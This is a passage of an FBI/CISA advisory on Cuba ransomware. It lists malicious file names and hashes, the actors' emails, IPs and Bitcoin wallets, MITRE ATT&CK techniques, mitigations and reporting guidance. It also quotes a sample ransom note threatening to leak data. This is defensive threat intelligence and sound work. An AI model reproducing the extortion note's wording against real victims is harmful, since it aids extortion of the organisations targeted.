<p>SHA256: 1f842f84750048bb44843c277edeaa8469697e97c4dbf8dc571ec552266bec9f</p>
</td>
</tr><tr><td>
<p>client32.exe</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>comctl32 .dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>comp2.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>comps2.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>cqyrrxzhumiklndm.aspx</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>defendercontrol.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>ff.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 1b943afac4f476d523310b8e3afe7bca761b8cbaa9ea2b9f01237ca4652fc834</p>
</td>
</tr><tr><td>
<p>File __agsyst121.dll</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>File __aswArPot.sys</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>File __s9239.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>File_agsyst121.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>File_aswArPot.sys</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>File_s9239.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>ga.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>gdi32 .dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>geumspbgvvytqrih.aspx</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>IObit UNLOCKER.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>kavsa32.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>MD5: 236f5de8620a6255f9003d054f08574b</p>
<p>SHA1: 9b546bd99272cf4689194d698c830a2510194722</p>
</td>
</tr><tr><td>
<p>kavsyst32.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>kernel32.dll</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>komar.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: B9AFE016DBDBA389000B01CE7645E7EEA1B0A50827CDED1CBAA48FBC715197BB</p>
</td>
</tr><tr><td>
<p>komar.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>komar121.bat</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>komar121.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>komar2.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 61971d3cbf88d6658e5209de443e212100afc8f033057d9a4e79000f6f0f7cc4</p>
</td>
</tr><tr><td>
<p>komar64.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 8E64BACAF40110547B334EADCB0792BDC891D7AE298FBFFF1367125797B6036B</p>
</td>
</tr><tr><td>
<p>mfcappk32.exe</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>newpass.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: c646199a9799b6158de419b1b7e36b46c7b7413d6c35bfffaeaa8700b2dcc427</p>
</td>
</tr><tr><td>
<p>npalll.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: bd270853db17f94c2b8e4bd9fa089756a147ed45cbc44d6c2b0c78f361978906</p>
</td>
</tr><tr><td>
<p>ole32.dll</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>oleaut32.dll</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>open.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 2EB3EF8A7A2C498E87F3820510752043B20CBE35B0CBD9AF3F69E8B8FE482676</p>
</td>
</tr><tr><td>
<p>open.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>pass.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 0afed8d1b7c36008de188c20d7f0e2283251a174261547aab7fb56e31d767666</p>
</td>
</tr><tr><td>
<p>pdfdecrypt.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>powerview.ps1</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>prt3389.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: e0d89c88378dcb1b6c9ce2d2820f8d773613402998b8dcdb024858010dec72ed</p>
</td>
</tr><tr><td>
<p>ra.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 571f8db67d463ae80098edc7a1a0cad59153ce6592e42d370a45df46f18a4ad8</p>
</td>
</tr><tr><td>
<p>rg1.exe</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>Rg2.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>rundll32</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>s64174.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 10a5612044599128981cb41d71d7390c15e7a2a0c2848ad751c3da1cbec510a2</p>
<p>SHA256: 1807549af1c8fdc5b04c564f4026e41790c554f339514d326f8b55cb7b9b4f79</p>
</td>
</tr><tr><td>
<p>s64174.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>s9239.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>s9239.dll</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>shell32.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>stel.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>syskav64.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>sysra64,exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>systav332.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 01242b35b6def71e42cc985e97d618e2fabd616b16d23f7081d575364d09ca74</p>
</td>
</tr><tr><td>
<p>TC-9.22a.2019.3.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>TeamViewer.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>testDLL.dll</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>tug4rigd.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 952b34f6370294c5a0bb122febfaa80612fef1f32eddd48a3d0556c4286b7474</p>
</td>
</tr><tr><td>
<p>UpdateNotificationPipeline.002.etl</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>user32.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>v1.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>v2.bat</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>v3.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>veeamp.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732</p>
</td>
</tr><tr><td>
<p>version.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>vlhqbgvudfnirmzx.aspx</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>wininet.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>wlog.exe</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>wpeqawzp.sys</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>y3lcx345.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>zero.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 3a8b7c1fe9bd9451c0a51e4122605efc98e7e4e13ed117139a13e4749e211ed0</p>
</td>
</tr><tr><td> </td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p> </p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr></tbody></table><p> </p>
<table class="Table"><caption><em>Table 2: Cuba Ransomware Associated Email Addresses, as of Late August 2022</em></caption>
<tbody><tr><td>
<p><a>Email Provider</a></p>
</td>
<td>
<p>Email Addresses</p>
</td>
</tr><tr><td>
<p>Cuba-supp[.]com</p>
</td>
<td>
<p>admin@cuba-supp[.]com</p>
</td>
</tr><tr><td>
<p>Encryption-support[.]com</p>
</td>
<td>
<p>admin@encryption-support[.]com</p>
</td>
</tr><tr><td>
<p>Mail.supports24[.]net</p>
</td>
<td>
<p>inbox@mail.supports24[.]net</p>
</td>
</tr></tbody></table><p> </p>
<table class="Table"><caption><em>Table 3: Cuba Ransomware Associated Jabber Address, as of Late August 2022</em></caption>
<tbody><tr><td>
<p>cuba_support@exploit[.]im</p>
</td>
</tr></tbody></table><p> </p>
<table class="Table"><caption><em>Table 4: IP Addresses Associated with Cuba Ransomware, as of Late August 2022<br />
	Note: Some of these observed IP addresses are more than a year old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action such as blocking. </em></caption>
<tbody><tr><td>
<p>193.23.244[.]244</p>
</td>
<td>
<p>144.172.83[.]13</p>
</td>
<td>
<p>216.45.55[.]30</p>
</td>
</tr><tr><td>
<p>94.103.9[.]79</p>
</td>
<td>
<p>149.255.35[.]131</p>
</td>
<td>
<p>217.79.43[.]148</p>
</td>
</tr><tr><td>
<p>192.137.101[.]46</p>
</td>
<td>
<p>154.35.175[.]225</p>
</td>
<td>
<p>222.252.53[.]33</p>
</td>
</tr><tr><td>
<p>92.222.172[.]39</p>
</td>
<td>
<p>159.203.70[.]39</p>
</td>
<td>
<p>23.227.198[.]246</p>
</td>
</tr><tr><td>
<p>92.222.172[.]172</p>
</td>
<td>
<p>171.25.193[.]9</p>
</td>
<td>
<p>31.184.192[.]44</p>
</td>
</tr><tr><td>
<p>10.13.102[.]1</p>
</td>
<td>
<p>185.153.199[.]169</p>
</td>
<td>
<p>37.120.247[.]39</p>
</td>
</tr><tr><td>
<p>10.13.102[.]58</p>
</td>
<td>
<p>192.137.100[.]96</p>
</td>
<td>
<p>37.44.253[.]21</p>
</td>
</tr><tr><td>
<p>10.133.78[.]41</p>
</td>
<td>
<p>192.137.100[.]98</p>
</td>
<td>
<p>38.108.119[.]121</p>
</td>
</tr><tr><td>
<p>10.14.100[.]20</p>
</td>
<td>
<p>192.137.101[.]205</p>
</td>
<td>
<p>45.164.21[.]13</p>
</td>
</tr><tr><td>
<p>103.114.163[.]197</p>
</td>
<td>
<p>193.34.167[.]17</p>
</td>
<td>
<p>45.32.229[.]66</p>
</td>
</tr><tr><td>
<p>103.27.203[.]197</p>
</td>
<td>
<p>194.109.206[.]212</p>
</td>
<td>
<p>45.86.162[.]34</p>
</td>
</tr><tr><td>
<p>104.217.8[.]100</p>
</td>
<td>
<p>195.54.160[.]149</p>
</td>
<td>
<p>45.91.83[.]176</p>
</td>
</tr><tr><td>
<p>107.189.10[.]143</p>
</td>
<td>
<p>199.58.81[.]140</p>
</td>
<td>
<p>64.52.169[.]174</p>
</td>
</tr><tr><td>
<p>108.170.31[.]115</p>
</td>
<td>
<p>204.13.164[.]118</p>
</td>
<td>
<p>64.235.39[.]82</p>
</td>
</tr><tr><td>
<p>128.31.0[.]34</p>
</td>
<td>
<p>209.76.253[.]84</p>
</td>
<td>
<p>79.141.169[.]220</p>
</td>
</tr><tr><td>
<p>128.31.0[.]39</p>
</td>
<td>
<p>212.192.241[.]230</p>
</td>
<td>
<p>84.17.52[.]135</p>
</td>
</tr><tr><td>
<p>131.188.40[.]189</p>
</td>
<td>
<p>213.32.39[.]43</p>
</td>
<td>
<p>86.59.21[.]38</p>
</td>
</tr><tr><td>
<p>141.98.87[.]124</p>
</td>
<td>
<p>216.45.55[.]3</p>
</td>
<td>
<p> </p>
</td>
</tr></tbody></table><p> </p>
<table class="Table"><caption><em>Table 5: Cuba Bitcoin Wallets Receiving Payments, as of Late August 2022</em></caption>
<tbody><tr><td>
<p><a></a>bc1q4vr25xkth35qslenqwd7aw020w85qrvlrhv7hc</p>
</td>
</tr><tr><td>
<p>bc1q5uc0fdnz0ve5pg4nl4upa9ly586t6wmnghfe7x</p>
</td>
</tr><tr><td>
<p>bc1q6rsj3cn37dngypu5kad9gdw5ykhctpwhjvun3z</p>
</td>
</tr><tr><td>
<p>bc1q6zkemtyyrre2mkk23g93zyq98ygrygvx7z2q0t</p>
</td>
</tr><tr><td>
<p>bc1q9cj0n9k2m282x0nzj6lhqjvhkkd4h95sewek83</p>
</td>
</tr><tr><td>
<p>bc1qaselp9nhejc3safcq3vn5wautx6w33x0llk7dl</p>
</td>
</tr><tr><td>
<p>bc1qc48q628t93xwzljtvurpqhcvahvesadpwqtsza</p>
</td>
</tr><tr><td>
<p>bc1qgsuf5m9tgxuv4ylxcmx8eeqn3wmlmu7f49zkus</p>
</td>
</tr><tr><td>
<p>bc1qhpepeeh7hlz5jvrp50uhkz59lhakcfvme0w9qh</p>
</td>
</tr><tr><td>
<p>bc1qjep0vx2lap93455p7h29unruvr05cs242mrcah</p>
</td>
</tr><tr><td>
<p>bc1qr9l0gcl0nvmngap6ueyy5gqdwvm34kdmtevjyx</p>
</td>
</tr><tr><td>
<p>bc1qs3lv77udkap2enxv928x59yuact5df4t95rsqr</p>
</td>
</tr><tr><td>
<p>bc1qyd05q2m5qt3nwpd3gcqkyer0gspqx5p6evcf7h</p>
</td>
</tr><tr><td>
<p>bc1qzz7xweq8ee2j35tq6r5m687kctq9huskt50edv</p>
</td>
</tr><tr><td>
<p>bc1qvpk8ksl3my6kjezjss9p28cqj4dmpmmjx5yl3y</p>
</td>
</tr><tr><td>
<p>bc1qhtwfcysclc7pck2y3vmjtpzkaezhcm6perc99x</p>
</td>
</tr><tr><td>
<p>bc1qft3s53ur5uq5ru6sl3zyr247dpr55mnggwucd3</p>
</td>
</tr><tr><td>
<p>bc1qp7h9fszlqxjwyfhv0upparnsgx56x7v7wfx4x7</p>
</td>
</tr><tr><td>
<p>bc1q4vr25xkth35qslenqwd7aw020w85qrvlrhv7hc</p>
</td>
</tr><tr><td>
<p>bc1q5uc0fdnz0ve5pg4nl4upa9ly586t6wmnghfe7x</p>
</td>
</tr><tr><td>
<p>bc1q6rsj3cn37dngypu5kad9gdw5ykhctpwhjvun3z</p>
</td>
</tr><tr><td>
<p>bc1q6zkemtyyrre2mkk23g93zyq98ygrygvx7z2q0t</p>
</td>
</tr><tr><td>
<p>bc1q9cj0n9k2m282x0nzj6lhqjvhkkd4h95sewek83</p>
</td>
</tr><tr><td>
<p>bc1qaselp9nhejc3safcq3vn5wautx6w33x0llk7dl</p>
</td>
</tr><tr><td>
<p>bc1qc48q628t93xwzljtvurpqhcvahvesadpwqtsza</p>
</td>
</tr><tr><td>
<p>bc1qgsuf5m9tgxuv4ylxcmx8eeqn3wmlmu7f49zkus</p>
</td>
</tr><tr><td>
<p>bc1qhpepeeh7hlz5jvrp50uhkz59lhakcfvme0w9qh</p>
</td>
</tr><tr><td>
<p>bc1qjep0vx2lap93455p7h29unruvr05cs242mrcah</p>
</td>
</tr><tr><td>
<p>bc1qr9l0gcl0nvmngap6ueyy5gqdwvm34kdmtevjyx</p>
</td>
</tr><tr><td>
<p>bc1qs3lv77udkap2enxv928x59yuact5df4t95rsqr</p>
</td>
</tr><tr><td>
<p>bc1qyd05q2m5qt3nwpd3gcqkyer0gspqx5p6evcf7h</p>
</td>
</tr><tr><td>
<p>bc1qzz7xweq8ee2j35tq6r5m687kctq9huskt50edv</p>
</td>
</tr></tbody></table><p> </p>
<p>See figure 1 for an example of a Cuba ransomware note.</p>
<table class="Table"><caption><em>Figure 1: Sample Cuba Ransom Note 2, as of late August 2022</em></caption>
<tbody><tr><td>
<p>Greetings! Unfortunately we have to report that your company were </p>
<p>compromised. All your files were </p>
<p>encrypted and you can’t restore them without our private key. Trying </p>
<p>to restore it without our help may </p>
<p>cause complete loss of your data. Also we researched whole your </p>
<p>corporate network and downloaded all </p>
<p>your sensitive data to our servers. If we will not get any contact </p>
<p>from you in the next 3 days we will public </p>
<p>it in our news site.</p>
<p>You can find it there ( </p>
<p>https[:]// cuba4ikm4jakjgmkeztyawtdgr2xymvy6nvgw5cglswg3si76icnqd.onion/ )</p>
<p>Tor Browser is needed ( https[:]//www.torproject.org/download/ )</p>
<p>Also we respect your work and time and we are open for communication. </p>
<p>In that case we are ready to discuss </p>
<p>recovering your files and work. We can grant absolute privacy and </p>
<p>compliance with agreements by our side. </p>
<p>Also we can provide all necessary evidence to confirm performance of </p>
<p>our products and statements.</p>
<p>Feel free to contact us with quTox ( https[:]//tox.chat/download.html )</p>
<p> </p>
<p>Our ToxID: 37790E2D198DFD20C9D2887D4EF7C3E295188842480192689864DCCA3C8BD808A18956768271</p>
<p> </p>
<p>Alternative method is email: inbox@mail.supports24[.]net</p>
<p> </p>
<p>Mark your messages with your personal ID: </p>
<p> </p>
</td>
</tr></tbody></table><p> </p>
<p>Additional resources to detect possible exploitation or compromise:</p>
<ul><li>Palo Alto Networks <a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">Novel News on Cuba Ransomware: Greetings From Tropical Scorpius</a></li>
<li>BlackBerry blog <a href="https://blogs.blackberry.com/en/2022/11/romcom-spoofing-solarwinds-keepass">RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the United Kingdom</a></li>
<li>BlackBerry blog <a href="https://blogs.blackberry.com/en/2022/10/unattributed-romcom-threat-actor-spoofing-popular-apps-now-hits-ukrainian-militaries">Unattributed RomCom Threat Actor Spoofing Popular Apps Now Hits Ukrainian Militaries</a></li>
</ul><h3>MITRE ATT&CK TECHNIQUES</h3>
<p>Cuba ransomware actors use the ATT&CK techniques listed in Table 6. <strong>Note:</strong> For details on TTPs listed in the table, see FBI Flash <a href="https://www.ic3.gov/Media/News/2021/211203-2.pdf">Indicators of Compromise Associated with Cuba Ransomware</a>.</p>
<table class="Table"><tbody><tr><td>
<p>Resource Development</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Compromise Infrastructure: Domains</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1584/001/">T1584.001</a></p>
</td>
<td>
<p>Cuba ransomware actors use compromised networks to conduct their operations.</p>
</td>
</tr><tr><td>
<p>Initial Access</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Valid Accounts</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1078/">T1078</a></p>
</td>
<td>
<p>Cuba ransomware actors have been known to use compromised credentials to get into a victim’s network. </p>
</td>
</tr><tr><td>
<p>External Remote Services</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1133/">T1133</a></p>
</td>
<td>
<p>Cuba ransomware actors may leverage external-facing remote services to gain initial access to a victim’s network.</p>
</td>
</tr><tr><td>
<p>Exploit Public-Facing Application</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1190/">T1190</a></p>
</td>
<td>
<p>Cuba ransomware actors are known to exploit vulnerabilities in public-facing systems.</p>
</td>
</tr><tr><td>
<p>Phishing</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1566/">T1566</a></p>
</td>
<td>
<p>Cuba ransomware actors have sent phishing emails to obtain initial access to systems.</p>
</td>
</tr><tr><td>
<p>Execution</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Command and Scripting Interpreter: PowerShell</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1059/001/">T1059.001</a></p>
</td>
<td>
<p>Cuba ransomware actors have used PowerShell to escalate privileges. </p>
</td>
</tr><tr><td>
<p>Software Deployment Tools</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1072/">T1072</a></p>
</td>
<td>
<p>Cuba ransomware actors use Hancitor as a tool to spread malicious files throughout a victim’s network.</p>
</td>
</tr><tr><td>
<p>Privilege Escalation</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Exploitation for Privilege Escalation</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1068/">T1068</a></p>
</td>
<td>
<p>Cuba ransomware actors have exploited ZeroLogon to gain administrator privileges.[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</p>
</td>
</tr><tr><td>
<p>Defense Evasion</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Impair Defenses: Disable or Modify Tools</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1562/001/">T1562.001</a></p>
</td>
<td>
<p>Cuba ransomware actors leveraged a loader that disables security tools within the victim network.</p>
</td>
</tr><tr><td>
<p>Lateral Movement</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Remote Services Session: RDP Hijacking</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1563/002/">T1563.002</a></p>
</td>
<td>
<p>Cuba ransomware actors used RDP sessions to move laterally.</p>
</td>
</tr><tr><td>
<p>Credential Access</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Credential Dumping: LSASS Memory</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1003/001/">T1003.001</a></p>
</td>
<td>
<p>Cuba ransomware actors use LSASS memory to retrieve stored compromised credentials.</p>
</td>
</tr><tr><td>
<p>Steal or Forge Kerberos Tickets: Kerberoasting</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1558/003/">T1558.003</a></p>
</td>
<td>
<p>Cuba ransomware actors used the Kerberoasting technique to identify service accounts linked to active directory.[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</p>
</td>
</tr><tr><td>
<p>Command and Control</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Proxy: Manipulate Command and Control Communications</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1090/">T1090</a></p>
</td>
<td>
<p>Industrial Spy ransomware actors use HTTP/HTTPS proxy via a C2 server to direct traffic to avoid direct connection. [<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</p>
</td>
</tr></tbody></table><div>
<h3>Mitigations</h3>
</div>
<p>FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Cuba ransomware:</p>
<ul><li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</li>
<li><strong>Require all accounts</strong> with password logins (e.g., service account, admin accounts, and domain admin accounts) <strong>to comply</strong> with <a href="https://pages.nist.gov/800-63-3/">National Institute for Standards and Technology (NIST) standards</a> for developing and managing password policies.
<ul><li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.</li>
<li>Store passwords in hashed format using industry-recognized password managers.</li>
<li>Add password user “salts” to shared login credentials.</li>
<li>Avoid reusing passwords.</li>
<li>Implement multiple failed login attempt account lockouts.</li>
<li>Disable password “hints.”</li>
<li>Refrain from requiring password changes more frequently than once per year.</li>
<li><strong>Note:</strong> NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>
<li>Require administrator credentials to install software.</li>
</ul></li>
<li><strong>Require <a href="https://www.cisa.gov/mfa">multifactor authentication</a></strong> for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.</li>
<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching SonicWall firewall vulnerabilities and <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities</a> in internet-facing systems. <strong>Note:</strong> SonicWall maintains a vulnerability list that includes Advisory ID, CVE, and mitigation. Their list can be found at <a href="https://psirt.global.sonicwall.com/vuln-list">psirt.global.sonicwall.com/vuln-list</a>.</li>
<li><strong>Segment networks</strong> to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus software</strong> on all hosts.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege.</li>
<li><strong>Disable unused ports.</strong></li>
<li><strong>Consider adding an email banner to emails</strong> received from outside your organization.</li>
<li><strong>Disable hyperlinks</strong> in received emails.</li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). JIT sets a network-wide policy in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.</li>
<li><strong>Maintain offline backups of data,</strong> and regularly maintain backup and restoration. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>
<li><strong>Ensure all backup data is encrypted, immutable</strong> (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.</li>
</ul><h3>RESOURCES</h3>
<ul><li><a href="https://www.stopransomware.gov/">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to mitigate a ransomware attack: <a href="https://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf">CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href="https://www.cisa.gov/cyber-hygiene-services">Cyber Hygiene Services</a> and <a href="https://github.com/cisagov/cset/releases/tag/v10.3.0.0">Ransomware Readiness Assessment</a>.</li>
</ul><h3>REPORTING</h3>
<p>FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents immediately. Report to a <a href="https://www.fbi.gov/contact-us/field-offices">local FBI Field Office</a>, or CISA at <a href="https://us-cert.cisa.gov/report">us-cert.cisa.gov/report</a>.</p>
<h3>DISCLAIMER</h3>
<p>The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI or CISA.</p>
<h3>ACKNOWLEDGEMENTS</h3>
